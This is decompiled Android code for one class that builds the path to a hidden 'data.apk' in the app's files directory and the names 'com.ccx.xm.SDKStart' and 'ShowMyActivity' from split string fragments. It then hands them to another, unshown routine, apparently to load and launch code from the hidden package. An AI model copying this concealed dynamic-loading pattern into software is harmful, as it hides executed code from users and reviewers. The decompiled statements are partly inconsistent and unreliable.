public class com.ccx.xm.a {
	 /* # direct methods */
	 public static void a ( android.app.Activity p0 ) {
		 /* .locals 15 */
		 (( android.app.Activity ) p0 ).getApplicationInfo ( ); // invoke-virtual {p0}, Landroid/app/Activity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
		 v0 = this.dataDir;
		 final String v1 = "com"; // const-string v1, "com"
		 final String v2 = ".cc"; // const-string v2, ".cc"
		 final String v3 = "x.xm"; // const-string v3, "x.xm"
		 final String v4 = ".SD"; // const-string v4, ".SD"
		 final String v5 = "KSta"; // const-string v5, "KSta"
		 final String v6 = "rt"; // const-string v6, "rt"
		 final String v7 = "ShowM"; // const-string v7, "ShowM"
		 final String v8 = "yActivi"; // const-string v8, "yActivi"
		 final String v9 = "ty"; // const-string v9, "ty"
		 final String v10 = "/file"; // const-string v10, "/file"
		 final String v11 = "s/dat"; // const-string v11, "s/dat"
		 final String v12 = "a.apk"; // const-string v12, "a.apk"
		 /* new-instance v13, Ljava/lang/StringBuilder; */
		 java.lang.String .valueOf ( v0 );
		 /* invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 (( java.lang.StringBuilder ) v13 ).append ( v10 ); // invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v10 ).append ( v11 ); // invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v10 ).append ( v12 ); // invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v10 ).toString ( ); // invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
		 /* new-instance v11, Ljava/lang/StringBuilder; */
		 java.lang.String .valueOf ( v0 );
		 /* invoke-direct {v11, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 final String v0 = "/files"; // const-string v0, "/files"
		 (( java.lang.StringBuilder ) v11 ).append ( v0 ); // invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
		 /* new-instance v11, Ljava/lang/StringBuilder; */
		 java.lang.String .valueOf ( v1 );
		 /* invoke-direct {v11, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 (( java.lang.StringBuilder ) v11 ).append ( v2 ); // invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v1 ).append ( v3 ); // invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v1 ).append ( v4 ); // invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v1 ).append ( v5 ); // invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v1 ).append ( v6 ); // invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
		 /* new-instance v2, Ljava/lang/StringBuilder; */
		 java.lang.String .valueOf ( v7 );
		 /* invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
		 (( java.lang.StringBuilder ) v2 ).append ( v8 ); // invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v2 ).append ( v9 ); // invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
		 (( java.lang.StringBuilder ) v2 ).toString ( ); // invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
		 com.games.a .a ( p0,v10,v0,v1,v2 );
		 return;
	 } // .end method
